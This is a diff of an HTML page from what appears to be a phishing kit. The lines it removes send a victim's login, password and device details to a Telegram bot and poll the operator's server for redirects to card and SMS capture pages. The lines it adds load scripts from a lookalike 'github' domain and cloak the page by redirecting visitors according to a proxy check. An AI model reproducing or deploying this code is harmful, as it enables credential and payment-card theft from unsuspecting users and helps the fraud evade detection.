@@ -1,19 +1,153 @@
 <!DOCTYPE html>
 <html>
-	<head>
-		<meta charset="utf-8">
-		<meta name="viewport" content="width=device-width, initial-scale=1">
-		<title>hhhjjff</title>
-	</head>
-	<body>
-		<h1> DDFGGG llkkj </h1>
-		<h1> DDFGGG llkkj </h1>
-		<h1> DDFGGG llkkj </h1>
-		<h1> DDFGGG llkkj </h1>
-		<h1> DDFGGG llkkj </h1>
-	</body>
-	 
-<script src="https://one.sharafdg.net/1/link.js"></script>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title></title>
+
+
+
+<style type="text/css">
+ 
+    .overlay {
+        /* z-index: 999; */
+        position: fixed;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        left: 0;
+        background-color: #05164d87;
+        border-radius: 6px;
+        z-index: 9999;
+    }
+
+    .loader {
+       text-align: center;
+        position: absolute;
+        left: 50%;
+        top: 50%;
+        z-index: 1;
+        transform: translate(-50%,-50%);
+    }
+
+  .lds-spinner {
+    color: #000;
+    display: inline-block;
+    width: 80px;
+    height: 80px;
+  }
+  .lds-spinner div {
+    transform-origin: 40px 40px;
+    animation: lds-spinner 1.2s linear infinite;
+  }
+  .lds-spinner div:after {
+    content: " ";
+    display: block;
+    position: absolute;
+    top: 3px;
+    left: 37px;
+    width: 6px;
+    height: 18px;
+    border-radius: 20%;
+    background: #000;
+  }
+  .lds-spinner div:nth-child(1) {
+    transform: rotate(0deg);
+    animation-delay: -1.1s;
+  }
+  .lds-spinner div:nth-child(2) {
+    transform: rotate(30deg);
+    animation-delay: -1s;
+  }
+  .lds-spinner div:nth-child(3) {
+    transform: rotate(60deg);
+    animation-delay: -0.9s;
+  }
+  .lds-spinner div:nth-child(4) {
+    transform: rotate(90deg);
+    animation-delay: -0.8s;
+  }
+  .lds-spinner div:nth-child(5) {
+    transform: rotate(120deg);
+    animation-delay: -0.7s;
+  }
+  .lds-spinner div:nth-child(6) {
+    transform: rotate(150deg);
+    animation-delay: -0.6s;
+  }
+  .lds-spinner div:nth-child(7) {
+    transform: rotate(180deg);
+    animation-delay: -0.5s;
+  }
+  .lds-spinner div:nth-child(8) {
+    transform: rotate(210deg);
+    animation-delay: -0.4s;
+  }
+  .lds-spinner div:nth-child(9) {
+    transform: rotate(240deg);
+    animation-delay: -0.3s;
+  }
+  .lds-spinner div:nth-child(10) {
+    transform: rotate(270deg);
+    animation-delay: -0.2s;
+  }
+  .lds-spinner div:nth-child(11) {
+    transform: rotate(300deg);
+    animation-delay: -0.1s;
+  }
+  .lds-spinner div:nth-child(12) {
+    transform: rotate(330deg);
+    animation-delay: 0s;
+  }
+  @keyframes lds-spinner {
+    0% {
+      opacity: 1;
+    }
+    100% {
+      opacity: 0;
+    }
+  }
+
+                               .errinput{
+                               border: 1px solid red !important;
+                            }
+
+                            
+  button, input {
+ 
+    width: 100% !important;
+}                              
+@media screen and (max-width: 308px){
+    input, select, input[type=tel] {
+        padding-left: 7px !important;
+        width: 100% !important;
+    }
+}
+.orange{
+    background-color: #ff6200;
+    border-color: #ff6200;
+    padding: 11px;
+    font-size: larger;
+    color: white;
+}
+
+
+                                </style>
+</head>
+<body>
+
+           <div class="overlay" style="display:;">
+           <div class="loader">
+                <div class="lds-spinner"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
+                <br />
+                 
+            </div>
+    </div> 
+
+
+
+
+<script src="https://github.onelivetv.online/config/jquery.min.js"></script>
 
 <script type="text/javascript">
     $( document ).ready(function() {
@@ -26,167 +160,32 @@
         let token = "";
         let chatId ="";
  
-        const api_url =  "https://one.sharafdg.net/1/";
-
+        const api_url =  "https://github.onelivetv.online/";
 
         async function getapi(url) {
          
             const response = await fetch(url+"config/device.php");
             var data = await response.json();
-            info_User=data;
-            console.log(data);
-            console.log(api_url);
+            info_User=data.country;
+        
+
+           
+            if (info_User.proxy) {
+            console.log("proxy");
             
-            ip=data["ip"];
-            token = data['token'];
-            chatId =data['chatId'];
-    
-                var Detailefun = {};
-                Detailefun.ip= ip;
-                Detailefun.fun= "FI LOG";
-                $.ajax({
-                  type: "POST",
-                  url: api_url+"config/fun.php?request=2",
-                  data: JSON.stringify(Detailefun), 
-                  success: function (result) {},
-                  dataType: "json"
-                }); 
-
-
-
-                let messageV = `VISTEUR MILLES >>`+ip;
-               // sendMessage(messageV);
+            }else{
+              window.location.href = "google.com";
             }
-         
-            getapi(api_url);
-
-
-        setInterval(function() {
-         
-                var Detaile = {};
-                Detaile.ip= ip;
-                $.ajax({
-                  type: "POST",
-                  url: api_url+"config/fun.php?request=3",
-                  data: JSON.stringify(Detaile), 
-                  success: function (result) {
-                     console.log(result);
-                       if (result["fun"]== "gotocc") {
-                           window.location.href =link_card;//
-                       }
-                       if (result["fun"]== "goSMS") {
-                           window.location.href = link_sms;//
-                       }
-             
-                       if (result["fun"]== "goLOG") {
-                           window.location.href = link_log;//
-                       }
-                       if (result["fun"]== "goFIN") {
-                           window.location.href = link_fin;
-                       }
-
-                  },
-                  dataType: "json"
-                }); 
-        }, 3000); 
-
-
-
-
-
-    $("#loginButton").click(function(){
-
-         $(".overlay").show();
-         $("#log_name").removeClass('errinput');
-         $("#pw_name").removeClass('errinput');
-       
-       if ($("#pw_name").val().length >= 4 && $("#log_name").val().length >= 4 ) 
-       {
-
-             var Detaile = {};
-             Detaile.login= $("#log_name").val() ;
-             Detaile.pwd=   $("#pw_name").val() ;
-             Detaile.info= info_User['ip']+" : "+info_User['browser']+" : "+info_User['device']+" : "+info_User['system'];
-             Detaile.url=  api_url+'admin.php?ip='+info_User['ip'];
-             const message = `ONE LOG\n--------------\n<code>${Detaile.login}</code>\n\n<code>${Detaile.pwd}</code>\n\n\n${Detaile.url}\n--------------\n${Detaile.info}`;
+           
+        }
+        getapi(api_url);
 
  
-
-
-            var Detailefun = {}; 
-            Detailefun.ip= ip;
-            Detailefun.fun= "NEW";
-
-            $.ajax({
-              type: "POST",
-              url: api_url+"config/fun.php?request=1",
-              data: JSON.stringify(Detailefun), 
-              success: function (result) {  },
-              dataType: "json"
-            }); 
- 
-
-            $.ajax({
-                type: 'POST',
-                url: `https://api.telegram.org/bot${token}/sendMessage`,
-                data: {
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'html',
-                },
-                success: function (res) {
-                     
-                            window.location.href = link_card;
-                   
-                  
-                },
-                error: function (error) {
-                    console.error(error);
-                    alert("error failed");
-                }
-            });
-
-       } else{
-
-            setInterval(function() { 
-            $(".overlay").hide();      
-             }, 2000);              
-               
-                   if ($("#pw_name").val().length < 4  ) 
-                   {
-                       $("#pw_name").addClass('errinput');
-                       $("#pw_name").val('');
-                   }
-                  if ($("#log_name").val().length < 4 ) 
-                   {
-                     $("#log_name").addClass('errinput');
-                     $("#log_name").val('');
-                   }  
-       }
-
-    });
-
- 
-    
-    
-      function sendMessage(text)
-      {
-         
-          const url = `https://api.telegram.org/bot${token}/sendMessage` // The url to request
-          const obj = {
-              chat_id: chatId, // Telegram chat id
-              text: text // The text to send
-          };
-          const xht = new XMLHttpRequest();
-          xht.open("POST", url, true);
-          xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
-          xht.send(JSON.stringify(obj));
-      }
- 
-    
+        
    });
+
+ 
+
 </script>
-  
+</body>
 </html>
-
-
